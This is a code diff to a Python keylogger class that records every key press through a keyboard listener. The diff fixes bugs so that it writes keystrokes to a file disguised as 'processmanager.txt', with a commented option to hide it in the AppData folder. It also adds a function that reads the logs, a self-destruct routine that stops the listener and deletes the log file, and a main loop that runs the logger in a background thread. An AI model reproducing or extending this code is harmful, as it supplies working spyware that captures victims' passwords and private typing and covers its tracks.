@@ -7,9 +7,10 @@ import threading
 class Keylogger():
     keys = []
     count = 0
+    flag = 0
+    # path = os.enviroment['appdata'] + '\\processmanager.txt'
 
-    #   path = os.enviroment['appdata'] + '\\processmanager.txt'
-    #   path = 'processmanager.txt'
+    path = 'processmanager.txt'
 
     def on_press(self, key):
         self.keys.append(key)
@@ -17,8 +18,12 @@ class Keylogger():
 
         if self.count >= 1:
             self.count = 0
-            self.write_file(keys)
+            self.write_file(self.keys)
             self.keys = []
+
+    def read_logs(self):
+        with open(self.path, 'rt') as f:
+            return f.read()
 
     def write_file(self, keys):
         with open(self.path, 'a') as f:
@@ -29,7 +34,7 @@ class Keylogger():
                 elif k.find('enter') > 0:
                     f.write('\n')
                 elif k.find('shift') > 0:
-                    k.write(' Shift ')
+                    f.write(' Shift ')
                 elif k.find('space') > 0:
                     f.write(' ')
                 elif k.find('caps_lock') > 0:
@@ -37,7 +42,24 @@ class Keylogger():
                 elif k.find('Key'):
                     f.write(k)
 
+    def self_destruct(self):
+        self.flag = 1
+        listener.stop()
+        os.remove(self.path)
+
     def start(self):
         global listener
         with Listener(on_press=self.on_press) as listener:
             listener.join()
+
+
+if __name__ == '__main__':
+    keylog = Keylogger()
+    t = threading.Thread(target=keylog.start) # keylog.start works. keylog.start() does not. most likely because target != method call
+    t.start()
+    while keylog.flag != 1:
+        time.sleep(10)
+        logs = keylog.read_logs()
+        print(logs)
+        # keylog.self_destruct()
+    t.join()
